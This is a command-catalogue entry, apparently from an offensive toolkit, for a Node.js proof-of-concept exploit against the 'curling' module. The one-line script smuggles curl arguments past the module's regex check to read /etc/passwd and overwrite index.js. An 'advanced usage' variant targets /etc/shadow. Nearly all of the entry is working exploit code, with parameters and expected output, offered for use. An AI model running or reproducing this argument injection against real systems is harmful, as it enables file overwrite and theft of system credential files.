---
id: cmd-node-poc-001
name: node-execute-curling-poc
type: command
executor: node
data: >-
  const curling = require('curling'); curling.run('file:///etc/passwd -o
  ./index.js', function(d, payload){console.log(payload)});
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:19.405Z'
platforms:
  - Node.js
  - Linux
tags:
  - rce
  - exploit
  - javascript
verified: false
validated: true
submitted: true
---

# node-execute-curling-poc

## Command

```javascript
const curling = require('curling'); curling.run('file:///etc/passwd -o ./index.js', function(d, payload){console.log(payload)});
```

## Description

This Node.js script exploits the curling module by injecting a curl command to read /etc/passwd and overwrite index.js, bypassing the module's inadequate regex validation for RCE demonstration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-o` | Curl output flag to write to file | Yes |
| `./index.js` | Target file to overwrite | Yes |
| `file:///etc/passwd` | File URL to read sensitive data | Yes |
| `function(d, payload)` | Callback to log response | Yes |

## Examples

### Basic Usage

Save as index.js and run `node index.js`.

### Advanced Usage

Modify payload for different files: `curling.run('file:///etc/shadow -o ./secret.txt', callback);`

## Expected Output

Console logs the payload contents; index.js overwritten with /etc/passwd data, e.g., user entries like "root:x:0:0:root:/root:/bin/bash".

## Related

- [[Related Procedure|procedures/Exploit-Curling-Module-for-RCE]]
